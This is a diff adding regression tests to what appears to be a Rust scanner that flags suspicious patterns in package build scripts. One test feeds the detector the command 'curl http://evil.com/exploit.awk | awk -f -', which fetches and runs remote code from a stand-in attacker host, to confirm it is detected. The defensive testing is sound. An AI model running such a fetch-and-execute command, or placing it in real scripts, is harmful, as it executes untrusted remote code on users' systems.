@@ -885,6 +885,21 @@ build() {
         assert!(!has(&ids, "G-INSTALL-SUID"), "Normal install should not trigger SUID pattern");
     }
 
+    // --- cross-line false positive regression ---
+
+    #[test]
+    fn curl_on_different_line_than_awk_no_signal() {
+        // curl on one line, awk on a later line — should NOT match across lines
+        let ids = analyze("curl -JLO \"$_iso\"\necho \"extracting\"\n7z x $(echo \"$_iso\" | awk -F \"/\" '{print $NF}') sources/install.wim");
+        assert!(!has(&ids, "G-PIPE-AWK"), "cross-line curl...awk should not trigger, got: {ids:?}");
+    }
+
+    #[test]
+    fn curl_pipe_awk_same_line_still_detected() {
+        let ids = analyze("curl http://evil.com/exploit.awk | awk -f -");
+        assert!(has(&ids, "G-PIPE-AWK"), "same-line curl|awk should still trigger, got: {ids:?}");
+    }
+
     // --- sed -e flag false positive regression ---
 
     #[test]
